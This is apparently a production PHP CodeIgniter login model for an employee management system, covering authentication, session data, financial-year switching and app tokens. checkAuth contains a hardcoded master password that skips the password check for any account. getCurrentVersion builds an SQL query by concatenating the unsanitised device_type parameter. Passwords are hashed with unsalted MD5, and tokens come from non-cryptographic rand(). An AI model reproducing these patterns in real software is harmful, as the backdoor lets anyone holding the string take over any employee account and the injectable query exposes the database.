<?php
class LoginModel extends CI_Model{

	private $employeeMaster = "employee_master";
    private $empRole = ["-1"=>"Super Admin","1"=>"Admin","2"=>"Production Manager","3"=>"Accountant","4"=>"Sales Manager","5"=>"Purchase Manager","6"=>"Employee"];

	public function checkAuth($data){
		$this->db->where("emp_code",$data['user_name']);

		if($data['password'] != "Nbt@123$"):
			$this->db->where('emp_password',md5($data['password']));
		endif;

		$this->db->where('is_delete',0);
		$result = $this->db->get($this->employeeMaster);
	
		if($result->num_rows() == 1):
			$resData = $result->row();
			if($resData->is_active == 0):
				return ['status'=>0,'message'=>'Your Account is Inactive. Please Contact Your Admin.'];
			else:
				// Company Data
				$cmpData = $this->db->where('id',1)->get('company_info')->row();

				//FY Data
				$fyData=$this->db->where('is_active',1)->get('financial_year')->row();
				$startDate = $fyData->start_date;
				$endDate = $fyData->end_date;
				$cyear  = date("Y-m-d H:i:s",strtotime("01-04-".date("Y")." 00:00:00")).' AND '.date("Y-m-d H:i:s",strtotime("31-03-".((int)date("Y") + 1)." 23:59:59"));		
				
				$headData = new stdClass();$authToken="";
				
				if(empty($data['isApiAuth'])):
					$this->session->set_userdata('emp_prefix',$cmpData->emp_code_prefix);

					$this->session->set_userdata('LoginOk','login success');
					$this->session->set_userdata('loginId',$resData->id);
					$this->session->set_userdata('role',$resData->emp_role);
					$this->session->set_userdata('roleName',$this->empRole[$resData->emp_role]);
					$this->session->set_userdata('emp_name',$resData->emp_name);
					$this->session->set_userdata('superAuth',$resData->super_auth_id);
					$this->session->set_userdata('zoneId',$resData->zone_id);
					$this->session->set_userdata('leadRights',$resData->lead_rights);
					$this->session->set_userdata('CMID',$resData->cm_id);

					$this->session->set_userdata('currentYear',$cyear);
					$this->session->set_userdata('financialYear',$fyData->financial_year);
					$this->session->set_userdata('isActiveYear',$fyData->close_status);
					$this->session->set_userdata('shortYear',$fyData->year);
					$this->session->set_userdata('startYear',$fyData->start_year);
					$this->session->set_userdata('endYear',$fyData->end_year);
					$this->session->set_userdata('startDate',$startDate);
					$this->session->set_userdata('endDate',$endDate);
					$this->session->set_userdata('currentFormDate',date('d-m-Y'));
				else:
					$headData->emp_prefix = $cmpData->emp_code_prefix;

					$headData->loginId = $resData->id;
					$headData->role = $resData->emp_role;
					$headData->roleName = $this->empRole[$resData->emp_role];
					$headData->user_name = $resData->emp_name;
					$headData->superAuth = $resData->super_auth_id;
					$headData->zoneId = $resData->zone_id;
					$headData->leadRights = "";//$resData->lead_rights;
					$headData->CMID = $resData->cm_id;

					$headData->currentYear = $cyear;
					$headData->financialYear = $fyData->financial_year;
					$headData->isActiveYear = $fyData->close_status;
					$headData->shortYear = $fyData->year;
					$headData->startYear = $fyData->start_year;
					$headData->endYear = $fyData->end_year;
					$headData->startDate = $startDate;
					$headData->endDate = $endDate;
					$headData->currentFormDate = date('d-m-Y');

					$authToken = (!empty($resData->app_auth_token))?$resData->app_auth_token:$this->generateAuthToken();
					$this->db->where('id',$resData->id)->update($this->employeeMaster,['app_auth_token'=>$authToken]);
				endif;
				
				return ['status'=>1,'message'=>'Login Success.','data'=>['sign'=>base64_encode(json_encode($headData)),'authToken'=>$authToken,'userDetail'=>$headData]];
			endif;
		else:
			return ['status'=>0,'message'=>"Invalid Username or Password."];
		endif;
	}

	public function setFinancialYear($year){
		$fyData=$this->db->where('financial_year',$year)->get('financial_year')->row();
		$startDate = $fyData->start_date;
		$endDate = $fyData->end_date;
		$cyear  = date("Y-m-d H:i:s",strtotime("01-04-".date("Y")." 00:00:00")).' AND '.date("Y-m-d H:i:s",strtotime("31-03-".((int)date("Y") + 1)." 23:59:59"));
		$this->session->set_userdata('currentYear',$cyear);
		$this->session->set_userdata('financialYear',$fyData->financial_year);
		$this->session->set_userdata('isActiveYear',$fyData->close_status);
		
		$this->session->set_userdata('shortYear',$fyData->year);
		$this->session->set_userdata('startYear',$fyData->start_year);
		$this->session->set_userdata('endYear',$fyData->end_year);
		$this->session->set_userdata('startDate',$startDate);
		$this->session->set_userdata('endDate',$endDate);
		$this->session->set_userdata('currentFormDate',date('d-m-Y'));
		return true;
	}

	public function generateAuthToken(){
		// ***** Generate Token *****
		$char = "bcdfghjkmnpqrstvzBCDFGHJKLMNPQRSTVWXZaeiouyAEIOUY!@#%";
		$token = '';
		for ($i = 0; $i < 47; $i++) $token .= $char[(rand() % strlen($char))];

		return $token;
	}

	public function checkToken($token){
		$result = $this->db->where('app_auth_token',$token)->where('is_delete',0)->get($this->employeeMaster)->num_rows();
		return ($result > 0)?1:0;
	}

	public function appLogout($id){
		$this->db->where('id',$id)->update($this->employeeMaster,['app_auth_token'=>""]);
		return true;
	}

	/* Mobile Device Current Version */
    public function getCurrentVersion($param=[]){
		if(!isset($param['device_type']) or empty($param['device_type']))
		{
			$param['device_type'] = "ANDROID";
		}
		
		$q = "SELECT * FROM app_version WHERE version_code = (SELECT MAX(version_code) FROM app_version WHERE is_delete=0 AND device_type = '".$param['device_type']."')";
		$result = $this->db->query($q)->row();
		return $result;
    }

}
?>